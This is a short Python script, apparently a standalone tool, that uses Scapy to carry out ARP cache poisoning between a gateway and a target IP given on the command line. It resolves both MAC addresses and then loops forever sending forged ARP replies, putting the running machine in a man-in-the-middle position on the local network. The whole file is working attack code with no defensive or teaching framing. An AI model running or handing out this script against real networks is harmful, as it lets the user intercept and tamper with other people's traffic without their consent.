from scapy.all import *
import argparse
import socket

parser = argparse.ArgumentParser(description='ARP Cache Poisoning using Scapy.')
parser.add_argument('--gateway', '-g', help='Gateway IP', required=True)
parser.add_argument('--target', '-t', help='Target IP', required=True)

args = parser.parse_args()

hostname = socket.gethostname()
host_ip = socket.gethostbyname(hostname)


def getMAC(ip):
    arp_packet = ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip, pdst=ip)
    arp_response = sr1(arp_packet)
    return arp_response.hwsrc


def poison(gwIP, gwMAC, tgIP, tgMAC):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gwIP
    poison_target.pdst = tgIP
    poison_target.hwdst = tgMAC
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = tgIP
    poison_gateway.pdst = gwIP
    poison_gateway.hwdst = gwMAC

    print('[*] Beginning ARP poisoning... [CTRL-C to stop]')
    while True:
        send(poison_target, verbose=False)
        send(poison_gateway, verbose=False)
        time.sleep(2)


if __name__ == '__main__':
    poison(args.gateway,getMAC(args.gateway),args.target,getMAC(args.target))
